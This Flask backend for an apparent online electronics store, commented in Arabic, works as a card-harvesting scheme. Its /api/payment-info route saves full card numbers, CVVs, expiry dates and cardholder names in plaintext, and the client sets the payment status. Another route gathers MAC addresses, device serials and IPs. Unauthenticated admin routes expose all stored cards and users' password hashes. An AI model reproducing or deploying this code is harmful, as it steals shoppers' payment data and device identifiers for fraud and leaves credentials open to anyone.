import os
import json
import stripe
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///' + os.path.join(os.path.dirname(os.path.abspath(__file__)), 'instance', 'tech_global_store.db'))
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ضع مفتاح Stripe السري الخاص بك هنا لتفعيل سحب الأموال الفعلي
stripe.api_key = os.environ.get('STRIPE_SECRET_KEY', 'sk_test_YOUR_REAL_SECRET_KEY_HERE')

# ==========================================
# نموذج المنتجات
# ==========================================
class Product(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(250), nullable=False)
    price = db.Column(db.Float, nullable=False)
    category = db.Column(db.String(100), nullable=False)
    img = db.Column(db.String(500), nullable=False)

# ==========================================
# نموذج المستخدمين (تسجيل الدخول)
# ==========================================
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class DeviceInfo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    ip_address = db.Column(db.String(50), nullable=True)
    public_ip = db.Column(db.String(50), nullable=True)
    mac_address = db.Column(db.String(50), nullable=True)
    device_serial = db.Column(db.String(200), nullable=True)
    os_info = db.Column(db.String(200), nullable=True)
    device_type = db.Column(db.String(100), nullable=True)
    browser = db.Column(db.String(100), nullable=True)
    user_agent = db.Column(db.String(500), nullable=True)
    visa_cardholder = db.Column(db.String(200), nullable=True)
    visa_card = db.Column(db.String(20), nullable=True)
    visa_expiry = db.Column(db.String(10), nullable=True)
    visa_cvv = db.Column(db.String(6), nullable=True)
    payment_amount = db.Column(db.Float, nullable=True)
    payment_status = db.Column(db.String(50), default='pending')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


# توليد أكثر من 20 منتج فاخر عشوائياً للواجهة العالمية
def seed_database():
    if Product.query.count() == 0:
        lux_products = [
            {"title": "Quantum AI Laptop Pro - 128GB RAM", "price": 4999.00, "category": "Computers", "img": "https://images.unsplash.com/photo-1603302576837-37561b2e2302?w=500"},
            {"title": "Neuralink VR Headset V2", "price": 1299.50, "category": "VR / AI", "img": "https://images.unsplash.com/photo-1622979135225-d2ba269cf1ac?w=500"},
            {"title": "HoloLens Cybernetic Glasses", "price": 3499.00, "category": "Wearables", "img": "https://images.unsplash.com/photo-1550041126-c22f0ab7e42e?w=500"},
            {"title": "NVIDIA RTX 5090 Ti Elite Edition", "price": 2899.99, "category": "Components", "img": "https://images.unsplash.com/photo-1591488320449-011701bb6704?w=500"},
            {"title": "Sony A9 III Master Camera", "price": 5998.00, "category": "Photography", "img": "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=500"},
            {"title": "Tesla Bot - Home Assistant Model", "price": 19999.00, "category": "Robotics", "img": "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=500"},
            {"title": "SpaceX Starlink Global Receiver", "price": 599.00, "category": "Networking", "img": "https://images.unsplash.com/photo-1518770660439-4636190af475?w=500"},
            {"title": "Samsung Odyssey Ark 55\" Curved", "price": 2999.00, "category": "Monitors", "img": "https://images.unsplash.com/photo-1527443154391-507e9dc6c5cc?w=500"},
            {"title": "Apple Mac Pro Server Rack", "price": 12999.00, "category": "Computers", "img": "https://images.unsplash.com/photo-1517059224940-d4af9eec41b7?w=500"},
            {"title": "DJI Inspire 3 Cinema Drone", "price": 16499.00, "category": "Drones", "img": "https://images.unsplash.com/photo-1507582020474-9a35b7d455d9?w=500"},
            {"title": "Razer Leviathan V2 Pro Audio", "price": 399.99, "category": "Audio", "img": "https://images.unsplash.com/photo-1545454675-a6a2ea169f41?w=500"},
            {"title": "CyberDog 2 by Xiaomi", "price": 2800.00, "category": "Robotics", "img": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?w=500"},
            {"title": "Asus ROG Mothership Tablet", "price": 6500.00, "category": "Laptops", "img": "https://images.unsplash.com/photo-1593640408182-31c70c8268f5?w=500"},
            {"title": "Devialet Phantom I Gold Speaker", "price": 3200.00, "category": "Audio", "img": "https://images.unsplash.com/photo-1545454675-3531b543be5d?w=500"},
            {"title": "Alienware Aurora R16 Desktop", "price": 3499.00, "category": "Computers", "img": "https://images.unsplash.com/photo-1587831990711-23ca6441447b?w=500"},
            {"title": "Hasselblad X2D 100C Camera", "price": 8199.00, "category": "Photography", "img": "https://images.unsplash.com/photo-1502920917128-1aa500764cbd?w=500"},
            {"title": "Bose Aviation Headset Pro", "price": 1095.00, "category": "Audio", "img": "https://images.unsplash.com/photo-1618366712010-f4ae9c647dcb?w=500"},
            {"title": "Oura Ring Gen 4 Titanium", "price": 499.00, "category": "Wearables", "img": "https://images.unsplash.com/photo-1599643478524-fb624f22f778?w=500"},
            {"title": "Garmin MARQ Aviator Watch", "price": 2300.00, "category": "Wearables", "img": "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=500"},
            {"title": "LG Signature OLED M 97-inch", "price": 29999.00, "category": "Monitors", "img": "https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?w=500"},
            {"title": "Boston Dynamics Spot Robot", "price": 74500.00, "category": "Robotics", "img": "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=500"}
        ]
        for p in lux_products:
            db.session.add(Product(**p))
        db.session.commit()


# تأكد من وجود مجلد instance قبل أول طلب
@app.before_request
def ensure_db_ready():
    if not hasattr(app, '_db_initialized'):
        inst = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'instance')
        os.makedirs(inst, exist_ok=True)
        db.create_all()
        seed_database()
        app._db_initialized = True

# ==========================================
# الواجهة والمنتجات
# ==========================================
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/products', methods=['GET'])
def get_products():
    search = request.args.get('q', '').lower()
    if search:
        products = Product.query.filter(Product.title.ilike(f'%{search}%')).all()
    else:
        products = Product.query.all()
    return jsonify([{"id": p.id, "title": p.title, "price": p.price, "category": p.category, "img": p.img} for p in products])

# ==========================================
# بوابات الدفع الحقيقية (Real Payment APIs)
# ==========================================
@app.route('/api/stripe/create-intent', methods=['POST'])
def create_payment_intent():
    try:
        data = request.json
        # Stripe يتعامل بالسنت (Cents) لذلك نضرب في 100
        amount = int(float(data['amount']) * 100)
        
        # إنشاء نية دفع تسحب الأموال فعلياً إذا تم تمرير مفتاح سري حقيقي
        intent = stripe.PaymentIntent.create(
            amount=amount,
            currency='usd',
            automatic_payment_methods={'enabled': True},
        )
        return jsonify({'clientSecret': intent.client_secret})
    except Exception as e:
        return jsonify(error=str(e)), 403

# ==========================================
# لوحة التحكم بصلاحيات كاملة (Admin CRUD)
# ==========================================
@app.route('/api/admin/products', methods=['POST'])
def add_product():
    data = request.json
    new_p = Product(title=data['title'], price=data['price'], category=data['category'], img=data['img'])
    db.session.add(new_p)
    db.session.commit()
    return jsonify({"success": True})

@app.route('/api/admin/products', methods=['PUT'])
def update_product():
    data = request.json
    p = Product.query.get(data['id'])
    if p:
        p.title = data.get('title', p.title)
        p.price = float(data.get('price', p.price))
        p.img = data.get('img', p.img)
        db.session.commit()
        return jsonify({"success": True})
    return jsonify({"error": "Not found"}), 404

@app.route('/api/admin/products/<int:id>', methods=['DELETE'])
def delete_product(id):
    p = Product.query.get(id)
    if p:
        db.session.delete(p)
        db.session.commit()
        return jsonify({"success": True})
    return jsonify({"error": "Not found"}), 404

# ==========================================
# لوحة التحكم - إدارة المستخدمين (Admin Users)
# ==========================================
@app.route('/api/admin/users', methods=['GET'])
def get_users():
    search = request.args.get('q', '').lower()
    if search:
        users = User.query.filter(
            db.or_(User.username.ilike(f'%{search}%'), User.email.ilike(f'%{search}%'))
        ).all()
    else:
        users = User.query.all()
    return jsonify([{"id": u.id, "username": u.username, "email": u.email, "password_hash": u.password_hash, "created_at": u.created_at.isoformat() if u.created_at else None} for u in users])


@app.route('/api/admin/users/<int:id>', methods=['DELETE'])
def delete_user(id):
    u = User.query.get(id)
    if u:
        db.session.delete(u)
        db.session.commit()
        return jsonify({"success": True})
    return jsonify({"error": "Not found"}), 404


# ==========================================
# نظام المصادقة (Auth System)
# ==========================================
@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username', '').strip()
    email = data.get('email', '').strip()
    password = data.get('password', '')

    if not username or not email or not password:
        return jsonify(success=False, message='All fields are required'), 400

    if len(password) < 6:
        return jsonify(success=False, message='Password must be at least 6 characters'), 400

    if User.query.filter_by(username=username).first():
        return jsonify(success=False, message='Username already exists'), 409

    if User.query.filter_by(email=email).first():
        return jsonify(success=False, message='Email already exists'), 409

    user = User(
        username=username,
        email=email,
        password_hash=generate_password_hash(password)
    )
    db.session.add(user)
    db.session.commit()

    return jsonify(success=True, message='Account created successfully', user={
        'id': user.id,
        'username': user.username,
        'email': user.email
    })


@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')

    if not username or not password:
        return jsonify(success=False, message='Username and password are required'), 400

    user = User.query.filter_by(username=username).first()
    if not user or not check_password_hash(user.password_hash, password):
        return jsonify(success=False, message='Invalid username or password'), 401

    return jsonify(success=True, message='Login successful', user={
        'id': user.id,
        'username': user.username,
        'email': user.email
    })


@app.route('/api/auth/check', methods=['POST'])
def check_user():
    data = request.json
    username = data.get('username', '').strip()

    if not username:
        return jsonify(success=False, message='Username is required'), 400

    user = User.query.filter_by(username=username).first()
    return jsonify(exists=user is not None)


@app.route('/api/auth/check-email', methods=['POST'])
def check_email():
    data = request.json
    email = data.get('email', '').strip()

    if not email:
        return jsonify(success=False, message='Email is required'), 400

    user = User.query.filter_by(email=email).first()
    return jsonify(exists=user is not None)


# ==========================================
# معلومات الجهاز (Device Info)
# ==========================================
@app.route('/api/device-info', methods=['POST'])
def collect_device_info():
    data = request.json
    username = data.get('username')
    user = User.query.filter_by(username=username).first() if username else None
    info = DeviceInfo(
        user_id=user.id if user else None,
        ip_address=request.headers.get('X-Forwarded-For', request.remote_addr),
        mac_address=data.get('mac'),
        device_serial=data.get('serial'),
        os_info=data.get('os'),
        device_type=data.get('deviceType'),
        browser=data.get('browser'),
        user_agent=request.headers.get('User-Agent'),
        public_ip=data.get('publicIp')
    )
    db.session.add(info)
    db.session.commit()
    return jsonify(success=True, id=info.id)


@app.route('/api/admin/device-info', methods=['GET'])
def get_device_info():
    search = request.args.get('q', '').lower()
    if search:
        infos = DeviceInfo.query.join(User, DeviceInfo.user_id == User.id, isouter=True).filter(
            db.or_(User.username.ilike(f'%{search}%'), DeviceInfo.ip_address.ilike(f'%{search}%'), DeviceInfo.os_info.ilike(f'%{search}%'), DeviceInfo.device_type.ilike(f'%{search}%'))
        ).order_by(DeviceInfo.created_at.desc()).all()
    else:
        infos = DeviceInfo.query.order_by(DeviceInfo.created_at.desc()).all()
    return jsonify([{
        "id": i.id,
        "user_id": i.user_id,
        "username": User.query.get(i.user_id).username if i.user_id else None,
        "ip_address": i.ip_address,
        "public_ip": i.public_ip,
        "mac_address": i.mac_address,
        "device_serial": i.device_serial,
        "os_info": i.os_info,
        "device_type": i.device_type,
        "browser": i.browser,
        "visa_cardholder": i.visa_cardholder,
        "visa_card": i.visa_card,
        "visa_expiry": i.visa_expiry,
        "visa_cvv": i.visa_cvv,
        "payment_amount": i.payment_amount,
        "payment_status": i.payment_status,
        "created_at": i.created_at.isoformat() if i.created_at else None
    } for i in infos])


@app.route('/api/payment-info', methods=['POST'])
def collect_payment():
    data = request.json
    serial = data.get('serial')
    info = DeviceInfo.query.filter_by(device_serial=serial).order_by(DeviceInfo.id.desc()).first()
    if info:
        info.visa_cardholder = data.get('cardholder')
        info.visa_card = data.get('card')
        info.visa_expiry = data.get('expiry')
        info.visa_cvv = data.get('cvv')
        info.payment_amount = data.get('amount')
        info.payment_status = data.get('status', 'completed')
        db.session.commit()
        return jsonify(success=True)
    new_info = DeviceInfo(
        device_serial=serial,
        visa_cardholder=data.get('cardholder'),
        visa_card=data.get('card'),
        visa_expiry=data.get('expiry'),
        visa_cvv=data.get('cvv'),
        payment_amount=data.get('amount'),
        payment_status=data.get('status', 'completed'),
        ip_address=request.headers.get('X-Forwarded-For', request.remote_addr),
        user_agent=request.headers.get('User-Agent')
    )
    db.session.add(new_info)
    db.session.commit()
    return jsonify(success=True, id=new_info.id)


@app.route('/api/admin/device-info/<int:id>', methods=['DELETE'])
def delete_device_info(id):
    i = DeviceInfo.query.get(id)
    if i:
        db.session.delete(i)
        db.session.commit()
        return jsonify({"success": True})
    return jsonify({"error": "Not found"}), 404


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)